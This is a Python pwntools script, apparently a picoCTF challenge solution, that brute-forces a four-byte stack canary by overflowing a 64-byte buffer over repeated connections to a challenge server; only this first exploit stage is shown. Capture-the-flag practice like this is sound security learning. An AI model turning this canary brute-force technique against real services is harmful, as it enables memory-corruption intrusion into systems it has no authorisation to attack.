#!/usr/bin/env python3

from pwn import *

# Connect to the remote server
# io = remote('saturn.picoctf.net', 60492)

# First stage: brute force the canary
canary = b''
for i in range(4):
    for guess in range(256):
        guess_byte = bytes([guess])
        try:
            # Create new connection for each attempt
            io = remote('saturn.picoctf.net', 60492)
            io.recvuntil(b'> ')
            
            # Send the length: buffer size + discovered canary + new guess
            payload_len = str(64 + len(canary) + 1).encode()
            io.sendline(payload_len)
            
            io.recvuntil(b'Input> ')
            
            # Create payload: buffer + discovered canary + new guess
            payload = b'A' * 64
            payload += canary + guess_byte
            io.sendline(payload)
            
            # Check response
            output = io.recvline(timeout=1)
            if b"***** Stack Smashing Detected *****" not in output:
                canary += guess_byte
                print(f'Found byte {i+1}: {hex(guess)}')
                io.close()
                break
        except:
            pass
        finally:
            io.close()

print(f'Canary value: {canary.hex()}')
